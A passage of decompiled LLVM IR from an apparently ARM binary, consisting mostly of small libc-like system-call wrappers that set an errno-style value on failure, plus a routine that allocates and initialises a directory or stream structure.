  %v1_109a8 = phi i32 [ %v0_10984, %dec_label_pc_10978 ], [ -1, %dec_label_pc_10994 ]
  %v2_109a4 = phi i32 [ %v3_10978, %dec_label_pc_10978 ], [ %v2_109a4.pre, %dec_label_pc_10994 ]
  store i32 %v2_109a4, i32* @r7, align 4
  ret i32 %v1_109a8

; uselistorder directives
  uselistorder i32 %v0_10984, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_109a4, { 1, 0 }
}

define i32 @function_109ac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_109ac:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_109ac = load i32, i32* @r7, align 4
  store i32 %v3_109ac, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_109d4, label %dec_label_pc_109c4

dec_label_pc_109c4:                               ; preds = %dec_label_pc_109ac
  %v0_109c4 = call i32 @function_11008()
  %v0_109c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_109c8 = sub i32 0, %v0_109c8
  %v2_109cc = inttoptr i32 %v0_109c4 to i32*
  store i32 %v1_109c8, i32* %v2_109cc, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_109d8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_109d4

dec_label_pc_109d4:                               ; preds = %dec_label_pc_109ac, %dec_label_pc_109c4
  %v2_109d8 = phi i32 [ %v3_109ac, %dec_label_pc_109ac ], [ %v2_109d8.pre, %dec_label_pc_109c4 ]
  %v0_109d4 = phi i32 [ %arg1, %dec_label_pc_109ac ], [ -1, %dec_label_pc_109c4 ]
  store i32 %v2_109d8, i32* @r7, align 4
  ret i32 %v0_109d4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_109d4, { 1, 0 }
}

define i32 @function_109e0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_109e0:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_109e0 = load i32, i32* @r7, align 4
  store i32 %v3_109e0, i32* %stack_var_-8, align 4
  %v0_109ec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_109ec, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_109ec, -4095
  br i1 %tmp, label %dec_label_pc_10a0c, label %dec_label_pc_109fc

dec_label_pc_109fc:                               ; preds = %dec_label_pc_109e0
  %v0_109fc = call i32 @function_11008()
  %v0_10a00 = load i32, i32* %r7.global-to-local, align 4
  %v1_10a00 = sub i32 0, %v0_10a00
  store i32 %v1_10a00, i32* @r3, align 4
  %v2_10a04 = inttoptr i32 %v0_109fc to i32*
  store i32 %v1_10a00, i32* %v2_10a04, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10a0c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10a0c

dec_label_pc_10a0c:                               ; preds = %dec_label_pc_109e0, %dec_label_pc_109fc
  %v1_10a10 = phi i32 [ %v0_109ec, %dec_label_pc_109e0 ], [ -1, %dec_label_pc_109fc ]
  %v2_10a0c = phi i32 [ %v3_109e0, %dec_label_pc_109e0 ], [ %v2_10a0c.pre, %dec_label_pc_109fc ]
  store i32 %v2_10a0c, i32* @r7, align 4
  ret i32 %v1_10a10

; uselistorder directives
  uselistorder i32 %v0_109ec, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10a0c, { 1, 0 }
}

define i32 @function_10a14(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10a14:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_10a14 = load i32, i32* @r3, align 4
  store i32 %v9_10a14, i32* %stack_var_-4, align 4
  %v2_10a2c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10a2c, i32* @r3, align 4
  %v0_10a50 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10a50, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10a50, -4095
  br i1 %tmp, label %dec_label_pc_10a70, label %dec_label_pc_10a60

dec_label_pc_10a60:                               ; preds = %dec_label_pc_10a14
  %v0_10a60 = call i32 @function_11008()
  %v0_10a64 = load i32, i32* %r7.global-to-local, align 4
  %v1_10a64 = sub i32 0, %v0_10a64
  store i32 %v1_10a64, i32* @r3, align 4
  %v2_10a68 = inttoptr i32 %v0_10a60 to i32*
  store i32 %v1_10a64, i32* %v2_10a68, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10a70

dec_label_pc_10a70:                               ; preds = %dec_label_pc_10a14, %dec_label_pc_10a60
  %v1_10a7c = phi i32 [ %v0_10a50, %dec_label_pc_10a14 ], [ -1, %dec_label_pc_10a60 ]
  ret i32 %v1_10a7c

; uselistorder directives
  uselistorder i32 %v0_10a50, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10a70, { 1, 0 }
}

define i32 @function_10a80(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10a80:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_10abc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10abc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10abc, -4095
  br i1 %tmp, label %dec_label_pc_10adc, label %dec_label_pc_10acc

dec_label_pc_10acc:                               ; preds = %dec_label_pc_10a80
  %v0_10acc = call i32 @function_11008()
  %v0_10ad0 = load i32, i32* %r7.global-to-local, align 4
  %v1_10ad0 = sub i32 0, %v0_10ad0
  %v2_10ad4 = inttoptr i32 %v0_10acc to i32*
  store i32 %v1_10ad0, i32* %v2_10ad4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10adc

dec_label_pc_10adc:                               ; preds = %dec_label_pc_10a80, %dec_label_pc_10acc
  %v1_10ae8 = phi i32 [ %v0_10abc, %dec_label_pc_10a80 ], [ -1, %dec_label_pc_10acc ]
  ret i32 %v1_10ae8

; uselistorder directives
  uselistorder i32 %v0_10abc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10adc, { 1, 0 }
}

define i32 @function_10aec(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10aec:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10aec = load i32, i32* @r7, align 4
  store i32 %v3_10aec, i32* %stack_var_-8, align 4
  %v0_10af8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10af8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10af8, -4095
  br i1 %tmp, label %dec_label_pc_10b18, label %dec_label_pc_10b08

dec_label_pc_10b08:                               ; preds = %dec_label_pc_10aec
  %v0_10b08 = call i32 @function_11008()
  %v0_10b0c = load i32, i32* %r7.global-to-local, align 4
  %v1_10b0c = sub i32 0, %v0_10b0c
  %v2_10b10 = inttoptr i32 %v0_10b08 to i32*
  store i32 %v1_10b0c, i32* %v2_10b10, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10b18.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10b18

dec_label_pc_10b18:                               ; preds = %dec_label_pc_10aec, %dec_label_pc_10b08
  %v1_10b1c = phi i32 [ %v0_10af8, %dec_label_pc_10aec ], [ -1, %dec_label_pc_10b08 ]
  %v2_10b18 = phi i32 [ %v3_10aec, %dec_label_pc_10aec ], [ %v2_10b18.pre, %dec_label_pc_10b08 ]
  store i32 %v2_10b18, i32* @r7, align 4
  ret i32 %v1_10b1c

; uselistorder directives
  uselistorder i32 %v0_10af8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10b18, { 1, 0 }
}

define i32 @function_10b20(i32 %arg1) local_unnamed_addr {
dec_label_pc_10b20:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10b20 = load i32, i32* @r7, align 4
  store i32 %v3_10b20, i32* %stack_var_-8, align 4
  %v0_10b2c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10b2c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10b2c, -4095
  br i1 %tmp, label %dec_label_pc_10b4c, label %dec_label_pc_10b3c

dec_label_pc_10b3c:                               ; preds = %dec_label_pc_10b20
  %v0_10b3c = call i32 @function_11008()
  %v0_10b40 = load i32, i32* %r7.global-to-local, align 4
  %v1_10b40 = sub i32 0, %v0_10b40
  %v2_10b44 = inttoptr i32 %v0_10b3c to i32*
  store i32 %v1_10b40, i32* %v2_10b44, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10b4c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10b4c

dec_label_pc_10b4c:                               ; preds = %dec_label_pc_10b20, %dec_label_pc_10b3c
  %v1_10b50 = phi i32 [ %v0_10b2c, %dec_label_pc_10b20 ], [ -1, %dec_label_pc_10b3c ]
  %v2_10b4c = phi i32 [ %v3_10b20, %dec_label_pc_10b20 ], [ %v2_10b4c.pre, %dec_label_pc_10b3c ]
  store i32 %v2_10b4c, i32* @r7, align 4
  ret i32 %v1_10b50

; uselistorder directives
  uselistorder i32 %v0_10b2c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10b4c, { 1, 0 }
}

define i32 @function_10b54(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10b54:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_10b54 = load i32, i32* @r3, align 4
  store i32 %v9_10b54, i32* %stack_var_-4, align 4
  %v2_10b60 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10b60, i32* @r3, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10b94, label %dec_label_pc_10b84

dec_label_pc_10b84:                               ; preds = %dec_label_pc_10b54
  %v0_10b84 = call i32 @function_11008()
  %v0_10b88 = load i32, i32* %r7.global-to-local, align 4
  %v1_10b88 = sub i32 0, %v0_10b88
  store i32 %v1_10b88, i32* @r3, align 4
  %v2_10b8c = inttoptr i32 %v0_10b84 to i32*
  store i32 %v1_10b88, i32* %v2_10b8c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10b94

dec_label_pc_10b94:                               ; preds = %dec_label_pc_10b54, %dec_label_pc_10b84
  %v0_10b94 = phi i32 [ %arg1, %dec_label_pc_10b54 ], [ -1, %dec_label_pc_10b84 ]
  ret i32 %v0_10b94

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10b94, { 1, 0 }
}

define i32 @function_10ba8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10ba8:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10ba8 = load i32, i32* @r7, align 4
  store i32 %v3_10ba8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10bd4, label %dec_label_pc_10bc4

dec_label_pc_10bc4:                               ; preds = %dec_label_pc_10ba8
  %v0_10bc4 = call i32 @function_11008()
  %v0_10bc8 = load i32, i32* %r7.global-to-local, align 4
  %v1_10bc8 = sub i32 0, %v0_10bc8
  %v2_10bcc = inttoptr i32 %v0_10bc4 to i32*
  store i32 %v1_10bc8, i32* %v2_10bcc, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_10bd8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10bd4

dec_label_pc_10bd4:                               ; preds = %dec_label_pc_10ba8, %dec_label_pc_10bc4
  %v2_10bd8 = phi i32 [ %v3_10ba8, %dec_label_pc_10ba8 ], [ %v2_10bd8.pre, %dec_label_pc_10bc4 ]
  %v0_10bd4 = phi i32 [ %arg1, %dec_label_pc_10ba8 ], [ -1, %dec_label_pc_10bc4 ]
  store i32 %v2_10bd8, i32* @r7, align 4
  ret i32 %v0_10bd4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10bd4, { 1, 0 }
}

define i32 @function_10be0(i32 %arg1) local_unnamed_addr {
dec_label_pc_10be0:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10be0 = load i32, i32* @r7, align 4
  store i32 %v3_10be0, i32* %stack_var_-8, align 4
  %v0_10bec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10bec, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10bec, -4095
  br i1 %tmp, label %dec_label_pc_10c0c, label %dec_label_pc_10bfc

dec_label_pc_10bfc:                               ; preds = %dec_label_pc_10be0
  %v0_10bfc = call i32 @function_11008()
  %v0_10c00 = load i32, i32* %r7.global-to-local, align 4
  %v1_10c00 = sub i32 0, %v0_10c00
  store i32 %v1_10c00, i32* @r3, align 4
  %v2_10c04 = inttoptr i32 %v0_10bfc to i32*
  store i32 %v1_10c00, i32* %v2_10c04, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10c0c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10c0c

dec_label_pc_10c0c:                               ; preds = %dec_label_pc_10be0, %dec_label_pc_10bfc
  %v1_10c10 = phi i32 [ %v0_10bec, %dec_label_pc_10be0 ], [ -1, %dec_label_pc_10bfc ]
  %v2_10c0c = phi i32 [ %v3_10be0, %dec_label_pc_10be0 ], [ %v2_10c0c.pre, %dec_label_pc_10bfc ]
  store i32 %v2_10c0c, i32* @r7, align 4
  ret i32 %v1_10c10

; uselistorder directives
  uselistorder i32 %v0_10bec, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c0c, { 1, 0 }
}

define i32 @function_10c14(i32* %arg1) local_unnamed_addr {
dec_label_pc_10c14:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_10c14 = load i32, i32* @r4, align 4
  store i32 %v3_10c14, i32* %stack_var_-24, align 4
  %v9_10c14 = load i32, i32* @r6, align 4
  %v12_10c14 = load i32, i32* @r7, align 4
  %v15_10c14 = load i32, i32* @r8, align 4
  %v18_10c14 = load i32, i32* @lr, align 4
  %v2_10c18 = load i32, i32* %arg1, align 4
  store i32 %v2_10c18, i32* %r4.global-to-local, align 4
  %v3_10c20 = icmp eq i32 %v2_10c18, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 124088, i32* @r6, align 4
  br i1 %v3_10c20, label %dec_label_pc_10c34, label %dec_label_pc_10c48

dec_label_pc_10c34:                               ; preds = %dec_label_pc_10c14
  %v0_10c34 = call i32 @function_11008()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_10c3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10c3c, i32* %r2.global-to-local, align 4
  %v2_10c40 = inttoptr i32 %v0_10c34 to i32*
  store i32 9, i32* %v2_10c40, align 4
  %v0_10ce8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10ce8

dec_label_pc_10c48:                               ; preds = %dec_label_pc_10c14
  store i32 36, i32* %r3.global-to-local, align 4
  %v1_10c4c = add i32 %tmp, 24
  store i32 %v1_10c4c, i32* %r4.global-to-local, align 4
  store i32 %v1_10c4c, i32* %r2.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_10c60 = load i32, i32* inttoptr (i32 124160 to i32*), align 256
  call void @__pseudo_branch(i32 %v4_10c60)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_10c78 = load i32, i32* @r6, align 4
  %v2_10c78 = add i32 %v0_10c78, 16
  %v3_10c78 = inttoptr i32 %v2_10c78 to i32*
  %v4_10c78 = load i32, i32* %v3_10c78, align 4
  call void @__pseudo_branch(i32 %v4_10c78)
  %v0_10c84 = load i32, i32* @r7, align 4
  %v1_10c84 = inttoptr i32 %v0_10c84 to i32*
  %v2_10c84 = load i32, i32* %v1_10c84, align 4
  store i32 %v2_10c84, i32* @r4, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_10c94 = load i32, i32* @r8, align 4
  store i32 %v0_10c94, i32* %v1_10c84, align 4
  %v0_10c98 = load i32, i32* @r6, align 4
  %v1_10c98 = load i32, i32* %r3.global-to-local, align 4
  %v2_10c98 = add i32 %v1_10c98, %v0_10c98
  %v3_10c98 = inttoptr i32 %v2_10c98 to i32*
  %v4_10c98 = load i32, i32* %v3_10c98, align 4
  store i32 ptrtoint (i32* @global_var_10ca4.290 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10c98)
  %v0_10ca4 = load i32, i32* @r7, align 4
  %v1_10ca4 = add i32 %v0_10ca4, 12
  %v2_10ca4 = inttoptr i32 %v1_10ca4 to i32*
  %v3_10ca4 = load i32, i32* %v2_10ca4, align 4
  store i32 %v3_10ca4, i32* @r0, align 4
  %v0_10ca8 = call i32 @function_12670()
  %v0_10cac = load i32, i32* @r7, align 4
  store i32 %v0_10cac, i32* @r0, align 4
  %v0_10cb0 = call i32 @function_12670()
  %v0_10cb8 = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_10cb8, -4095
  br i1 %tmp11, label %dec_label_pc_10ce4, label %dec_label_pc_10cd4

dec_label_pc_10cd4:                               ; preds = %dec_label_pc_10c48
  %v0_10cd4 = call i32 @function_11008()
  %v0_10cd8 = load i32, i32* @r4, align 4
  %v1_10cd8 = sub i32 0, %v0_10cd8
  store i32 %v1_10cd8, i32* %r3.global-to-local, align 4
  %v2_10cdc = inttoptr i32 %v0_10cd4 to i32*
  store i32 %v1_10cd8, i32* %v2_10cdc, align 4
  %v0_10ce0 = load i32, i32* @r8, align 4
  br label %dec_label_pc_10ce4

dec_label_pc_10ce4:                               ; preds = %dec_label_pc_10c48, %dec_label_pc_10cd4
  %v0_10ce4 = phi i32 [ %v0_10cb8, %dec_label_pc_10c48 ], [ %v0_10ce0, %dec_label_pc_10cd4 ]
  store i32 %v0_10ce4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10ce8

dec_label_pc_10ce8:                               ; preds = %dec_label_pc_10c34, %dec_label_pc_10ce4
  %v0_10ce8 = phi i32 [ %v0_10ce8.pre, %dec_label_pc_10c34 ], [ %v0_10ce4, %dec_label_pc_10ce4 ]
  %v2_10cf0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10cf0, i32* @r4, align 4
  store i32 %v9_10c14, i32* @r6, align 4
  store i32 %v12_10c14, i32* @r7, align 4
  store i32 %v15_10c14, i32* @r8, align 4
  store i32 %v18_10c14, i32* @lr, align 4
  ret i32 %v0_10ce8

; uselistorder directives
  uselistorder i32 %v0_10cb8, { 1, 0 }
  uselistorder label %dec_label_pc_10ce8, { 1, 0 }
  uselistorder label %dec_label_pc_10ce4, { 1, 0 }
}

define i32 @function_10cfc(i32 %arg1) local_unnamed_addr {
dec_label_pc_10cfc:
  %v0_10cfc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10cfc, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_10cfc
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_10cfc, %bb
  %v10_10d08 = phi i32 [ %arg1, %dec_label_pc_10cfc ], [ 0, %bb ]
  ret i32 %v10_10d08

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_10d0c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10d0c:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_10d0c = load i32, i32* @r5, align 4
  %v9_10d0c = load i32, i32* @r6, align 4
  %v12_10d0c = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_10d20 = call i32 @function_11604(i32 48)
  %v2_10d28 = icmp eq i32 %v1_10d20, 0
  store i32 124088, i32* @r6, align 4
  br i1 %v2_10d28, label %bb, label %dec_label_pc_10d38

bb:                                               ; preds = %dec_label_pc_10d0c
  br label %dec_label_pc_10dc4

dec_label_pc_10d38:                               ; preds = %dec_label_pc_10d0c
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10d3c = load i32, i32* @r4, align 4
  %v2_10d3c = icmp ugt i32 %v0_10d3c, 511
  %v2_10d40 = add i32 %v1_10d20, 4
  %v3_10d40 = inttoptr i32 %v2_10d40 to i32*
  store i32 0, i32* %v3_10d40, align 4
  %v0_10d44 = load i32, i32* %r3.global-to-local, align 4
  %v2_10d44 = add i32 %v1_10d20, 16
  %v3_10d44 = inttoptr i32 %v2_10d44 to i32*
  store i32 %v0_10d44, i32* %v3_10d44, align 4
  %v0_10d48 = load i32, i32* %r3.global-to-local, align 4
  %v2_10d48 = add i32 %v1_10d20, 8
  %v3_10d48 = inttoptr i32 %v2_10d48 to i32*
  store i32 %v0_10d48, i32* %v3_10d48, align 4
  br i1 %v2_10d3c, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_10d38
  %v0_10d502 = load i32, i32* @r4, align 4
  %v2_10d503 = add i32 %v1_10d20, 20
  %v3_10d504 = inttoptr i32 %v2_10d503 to i32*
  store i32 %v0_10d502, i32* %v3_10d504, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_10d38
  %v1_10d4c = load i32, i32* %r3.global-to-local, align 4
  %v2_10d4c = add i32 %v1_10d4c, 512
  store i32 %v2_10d4c, i32* %r3.global-to-local, align 4
  %v0_10d50 = load i32, i32* @r4, align 4
  %v2_10d50 = add i32 %v1_10d20, 20
  %v3_10d50 = inttoptr i32 %v2_10d50 to i32*
  store i32 %v0_10d50, i32* %v3_10d50, align 4
  %v1_10d54 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_10d54, i32* %v3_10d50, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_10d20, i32* @r5, align 4
  %v0_10d5c = load i32, i32* @r7, align 4
  %v2_10d5c = inttoptr i32 %v1_10d20 to i32*
  store i32 %v0_10d5c, i32* %v2_10d5c, align 4
  %v0_10d60 = load i32, i32* @r5, align 4
  %v1_10d60 = add i32 %v0_10d60, 20
  %v2_10d60 = inttoptr i32 %v1_10d60 to i32*
  %v3_10d60 = load i32, i32* %v2_10d60, align 4
  store i32 %v3_10d60, i32* %r1.global-to-local, align 4
  %v2_10d68 = call i32 @function_11f24(i32 1, i32 %v3_10d60)
  %v2_10d6c = icmp eq i32 %v2_10d68, 0
  store i32 %v2_10d68, i32* @r4, align 4
  %v1_10d74 = load i32, i32* @r5, align 4
  %v2_10d74 = add i32 %v1_10d74, 12
  %v3_10d74 = inttoptr i32 %v2_10d74 to i32*
  store i32 %v2_10d68, i32* %v3_10d74, align 4
  br i1 %v2_10d6c, label %dec_label_pc_10d7c, label %dec_label_pc_10d8c

dec_label_pc_10d7c:                               ; preds = %bb17
  %v0_10d7c = load i32, i32* @r5, align 4
  store i32 %v0_10d7c, i32* @r0, align 4
  %v0_10d80 = call i32 @function_12670()
  %v0_10d84 = load i32, i32* @r4, align 4
  br label %dec_label_pc_10dc4

dec_label_pc_10d8c:                               ; preds = %bb17
  store i32 0, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_10db4 = load i32, i32* @r5, align 4
  %v1_10db4 = add i32 %v0_10db4, 24
  %v1_10db8 = inttoptr i32 %v1_10db4 to i32*
  store i32 0, i32* %v1_10db8, align 4
  %v3_10db8 = add i32 %v0_10db4, 28
  %v4_10db8 = inttoptr i32 %v3_10db8 to i32*
  %v5_10db8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_10db8, i32* %v4_10db8, align 4
  %v6_10db8 = add i32 %v0_10db4, 32
  %v7_10db8 = inttoptr i32 %v6_10db8 to i32*
  %v8_10db8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_10db8, i32* %v7_10db8, align 4
  %v9_10db8 = add i32 %v0_10db4, 36
  %v10_10db8 = inttoptr i32 %v9_10db8 to i32*
  %v11_10db8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_10db8, i32* %v10_10db8, align 4
  %v12_10db8 = add i32 %v0_10db4, 40
  %v2_10dbc = load i32, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_10dc0 = inttoptr i32 %v12_10db8 to i32*
  store i32 %v2_10dbc, i32* %v1_10dc0, align 4
  %v3_10dc0 = add i32 %v0_10db4, 44
  %v4_10dc0 = inttoptr i32 %v3_10dc0 to i32*
  %v5_10dc0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_10dc0, i32* %v4_10dc0, align 4
  %v0_10dc4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10dc4

dec_label_pc_10dc4:                               ; preds = %bb, %dec_label_pc_10d7c, %dec_label_pc_10d8c
  %v0_10dc4 = phi i32 [ 0, %bb ], [ %v0_10d84, %dec_label_pc_10d7c ], [ %v0_10dc4.pre, %dec_label_pc_10d8c ]
  store i32 %v6_10d0c, i32* @r5, align 4
  store i32 %v9_10d0c, i32* @r6, align 4
  store i32 %v12_10d0c, i32* @r7, align 4
  ret i32 %v0_10dc4

; uselistorder directives
  uselistorder i32 %v2_10d68, { 1, 0, 2 }
  uselistorder i32 %v1_10d20, { 2, 1, 6, 0, 5, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 512, { 7, 4, 0, 5, 8, 1, 9, 2, 10, 3, 11, 6, 12 }
  uselistorder label %dec_label_pc_10dc4, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_10ddc(i32 %arg1) local_unnamed_addr {
dec_label_pc_10ddc:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v6_10ddc = load i32, i32* @r7, align 4
  %v2_10de4 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_10e0c, label %dec_label_pc_10dfc

dec_label_pc_10dfc:                               ; preds = %dec_label_pc_10ddc
  %v0_10dfc = call i32 @function_11008()
  %v0_10e00 = load i32, i32* @r7, align 4
  %v1_10e00 = sub i32 0, %v0_10e00
  %v2_10e04 = inttoptr i32 %v0_10dfc to i32*
  store i32 %v1_10e00, i32* %v2_10e04, align 4
  br label %dec_label_pc_10e30

dec_label_pc_10e0c:                               ; preds = %dec_label_pc_10ddc
  %v1_10e0c = icmp slt i32 %arg1, 0
  br i1 %v1_10e0c, label %dec_label_pc_10e30, label %dec_label_pc_10e14

dec_label_pc_10e14:                               ; preds = %dec_label_pc_10e0c
  store i32 %v2_10de4, i32* @r1, align 4
  %v0_10e18 = call i32 @function_13b20()
  %v1_10e1c = icmp slt i32 %v0_10e18, 0
  br i1 %v1_10e1c, label %dec_label_pc_10e24, label %dec_label_pc_10e38

dec_label_pc_10e24:                               ; preds = %dec_label_pc_10e14
  br label %dec_label_pc_10e30

dec_label_pc_10e30:                               ; preds = %dec_label_pc_10e24, %dec_label_pc_10e0c, %dec_label_pc_10dfc
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10e74

dec_label_pc_10e38:                               ; preds = %dec_label_pc_10e14
  %v0_10e40 = load i32, i32* @r7, align 4
  %v3_10e44 = call i32 @function_10a80(i32 %v0_10e40, i32 2, i32 1)
  %v0_10e48 = load i32, i32* @r7, align 4
  %v2_10e50 = call i32 @function_10d0c(i32 %v0_10e48, i32 %tmp)
  store i32 %v2_10e50, i32* %r4.global-to-local, align 4
  %v2_10e54 = icmp eq i32 %v2_10e50, 0
  br i1 %v2_10e54, label %dec_label_pc_10e5c, label %dec_label_pc_10e74

dec_label_pc_10e5c:                               ; preds = %dec_label_pc_10e38
